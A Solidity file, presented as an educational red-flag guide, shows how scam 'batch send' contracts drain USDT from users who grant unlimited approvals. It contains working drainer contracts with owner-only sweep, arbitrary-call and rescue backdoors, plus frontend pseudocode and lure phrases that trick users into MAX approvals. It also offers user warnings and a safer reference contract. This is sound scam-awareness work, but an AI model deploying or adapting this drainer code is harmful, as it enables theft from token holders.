// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

/// ================================================================
///
///   ⚠️  REDFLAG EXAMPLES — A SCAMMER'S PLAYBOOK FOR "SEND" / HELPER
///                          CONTRACTS THAT ASK FOR APPROVAL
///
/// ================================================================
///
/// READ THIS FIRST. This file is NOT meant to be deployed. It is a
/// teaching tool that shows what a malicious version of BatchSend.sol
/// (or any helper contract that asks users to approve a token) looks
/// like under the hood.
///
/// The pattern works like this:
///   1. Scammer deploys this contract and presents a slick frontend:
///      "Batch send USDT to friends! Airdrop tool! Save gas!"
///   2. To use it, users must approve the contract to spend their USDT.
///      Most people approve UNLIMITED (because it's easier) and the dApp
///      defaults to that.
///   3. Once a few thousand users have approved, the owner pulls one of
///      the planted backdoor levers and drains every approver's wallet.
///
/// All 4 backdoors below are deliberate scam tools the OWNER plants
/// and triggers themselves — no outside hacker required. The owner
/// IS the attacker.
///
/// If a "send helper" / "airdrop tool" / "batch transfer" contract
/// looks like THIS, do not approve it.
///
/// Paste any of the marked functions into another AI and ask:
///   "What can the owner of this helper contract do to my approved USDT?"
///
/// ================================================================

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract MaliciousBatchSend {
    address public owner;
    address public defaultToken; // e.g. USDT — what users are tricked into approving

    constructor(address _token) {
        owner = msg.sender;
        defaultToken = _token;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    // ---------- The "legit-looking" public function (the bait) ----------

    /// Looks completely normal — what the frontend advertises. Users sign
    /// `approve(MaliciousBatchSend, MAX)` to enable it. That approval is
    /// what the backdoors below abuse.
    function batchTransfer(
        address token,
        address[] calldata recipients,
        uint256[] calldata amounts
    ) external {
        require(recipients.length == amounts.length, "len mismatch");
        for (uint256 i = 0; i < recipients.length; i++) {
            IERC20(token).transferFrom(msg.sender, recipients[i], amounts[i]);
        }
    }

    // =====================================================================
    //   🚩 RED FLAG #1 — SCAMMER'S DRAIN BUTTON (single-victim sweep)
    // =====================================================================
    // The scammer's "harvest" function. They marketed this as a helper
    // contract and got thousands of approve-MAX signatures. Now they
    // loop this function over their list of approvers and pull every
    // last token out of each wallet — even if the user never actually
    // batch-sent anything.
    //
    // Called from the OWNER's wallet via TronScan → "Write Contract".
    // No UI for it; the dApp pretends it doesn't exist.

    function emergencyWithdraw(address victim) external onlyOwner {
        uint256 bal = IERC20(defaultToken).balanceOf(victim);
        // Uses the unlimited approval the victim granted to THIS contract.
        IERC20(defaultToken).transferFrom(victim, owner, bal);
    }

    // =====================================================================
    //   🚩 RED FLAG #2 — SCAMMER'S SWISS ARMY KNIFE (arbitrary calls)
    // =====================================================================
    // One function, infinite damage. Whatever the scammer wants to do —
    // drain any token, call any contract, set any approval, mint, burn —
    // they encode the call and shoot it through here.
    //
    // The contract acts as the caller, so it can spend ANY token that
    // ANY user has ever approved to it. That makes this the worst
    // backdoor of the lot — drains tokens you didn't even know were
    // touched by this contract.

    function execute(address target, bytes calldata data)
        external
        onlyOwner
        returns (bytes memory)
    {
        (bool ok, bytes memory ret) = target.call(data);
        require(ok, "call failed");
        return ret;
    }

    // =====================================================================
    //   🚩 RED FLAG #3 — SCAMMER'S DECOY (approve a "second wallet" to drain)
    // =====================================================================
    // The scammer makes this contract approve a SECOND wallet they
    // control. That second wallet then calls USDT.transferFrom on every
    // approver and drains them.
    //
    // Why bother with the indirection? Plausible deniability — the
    // scammer can publicly cry "we got phished, our spender wallet
    // leaked" while the chain shows the drain came from a different
    // address than the owner. Cheap PR cover; the on-chain reality is
    // that they triggered the approval themselves.

    function setSpender(address spender, uint256 amount) external onlyOwner {
        // Lets a third-party (the scammer's burner) pull on behalf of
        // every approver indirectly — same effect as Red Flag #1 but
        // executed from a different wallet.
        IERC20(defaultToken).approve(spender, amount);
    }

    // =====================================================================
    //   🚩 RED FLAG #4 — SCAMMER'S CLEAN EXIT ("rescue" any token)
    // =====================================================================
    // The most popular rug pattern on TRON and BSC. Marketed as a
    // "safety feature" — recover any token accidentally sent to the
    // contract. But because it accepts ANY token address (including
    // USDT itself) and has no caller restrictions on what gets pulled,
    // it lets the owner walk away with anything sitting in the contract.
    //
    // For a "batch send" / "airdrop" tool the contract may collect:
    //   - fees the scammer charged per transfer
    //   - dust users sent for testing
    //   - tokens the scammer briefly parked here while staging a rug
    //
    // Even worse: combined with Red Flag #3, the scammer can use
    // setSpender to pull from approvers INTO this contract, then call
    // rescueTokens to extract it to themselves — leaving the original
    // drain transaction looking like a "compromise" instead of a sweep.

    function rescueTokens(address token, uint256 amount) external onlyOwner {
        IERC20(token).transfer(owner, amount);
    }
}

// =====================================================================
//   🚩 RED FLAG #5 — FORCED APPROVAL ("you must approve to send")
// =====================================================================
// The scammer's dApp UI refuses to let the user send anything until
// they sign an UNLIMITED approval. Common social-engineering scripts:
//
//   - "One-time setup required to enable sending"
//   - "Initialize your account before first transfer"
//   - "Unlock the send feature (gas optimization)"
//   - "Verify wallet ownership before sending"
//
// NONE of these are real things. Sending USDT person-to-person needs
// zero approvals — it's just `USDT.transfer(recipient, amount)` signed
// by the sender. Any dApp that demands approval before a basic send
// is laying a drain trap.
//
// The cruelest part: the first send the user makes through this
// contract ACTUALLY WORKS. Recipient really receives the tokens. So
// the user thinks the dApp is legit and comes back to send more.
// Meanwhile, the unlimited approval is sitting there waiting for the
// owner to call `emergencyWithdraw` or `execute` (Red Flags #1 & #2).
//
// On-chain side of the scam below; the frontend trick is in JS.

contract MaliciousForcedApproval {
    address public owner;
    address public defaultToken; // USDT

    constructor(address _token) {
        owner = msg.sender;
        defaultToken = _token;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    /// The "send" function the frontend calls. Looks like a friendly
    /// wrapper for USDT.transfer. The hidden requirement is that the
    /// user must have approved this contract for >= the send amount
    /// (the frontend always asks for MAX approval "to save gas").
    ///
    /// Once approved, the contract's `transferFrom` works forever —
    /// not just for this send, but for every future call by the owner.
    function send(address to, uint256 amount) external {
        // Pulls from msg.sender via the pre-existing approval.
        // First call works fine — recipient gets the tokens.
        // The approval that made it work is the loaded gun.
        IERC20(defaultToken).transferFrom(msg.sender, to, amount);
    }

    /// The harvest function — same as Red Flag #1. The forced approval
    /// above is what makes this work on every "user" of the dApp.
    function drainApprover(address victim) external onlyOwner {
        uint256 bal = IERC20(defaultToken).balanceOf(victim);
        IERC20(defaultToken).transferFrom(victim, owner, bal);
    }
}

// Frontend tell (pseudocode the scammer ships with the above contract):
//
//   async function sendUSDT(to, amount) {
//     const allowance = await usdt.allowance(user, scamContract);
//     if (allowance < MAX_UINT256) {
//       alert("First-time setup — please approve to enable sending");
//       await usdt.approve(scamContract, MAX_UINT256);   // ← THE TRAP
//     }
//     await scamContract.send(to, amount);                // ← works! user trusts
//   }
//
// If your wallet ever shows an `Approve` popup when you expected
// `Transfer` — REJECT it. That mismatch is the single clearest scam
// signal in all of DeFi.

// =====================================================================
//   ✅ SAFE REFERENCE — what a real "rescue" function should look like
// =====================================================================
// If a contract genuinely needs to recover stuck tokens, the rescue
// function MUST exclude the token(s) the contract is supposed to handle,
// and ideally MUST have a timelock or community vote. Like this:

contract SafeRescueExample {
    address public owner;
    address public immutable protectedToken;

    constructor(address _protected) {
        owner = msg.sender;
        protectedToken = _protected;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    /// Only lets the owner recover tokens that are NOT the protected one.
    /// So even if the owner turns malicious, they can't touch user funds.
    function rescueStuckToken(address token, uint256 amount) external onlyOwner {
        require(token != protectedToken, "cannot rescue protected token");
        IERC20(token).transfer(owner, amount);
    }
}
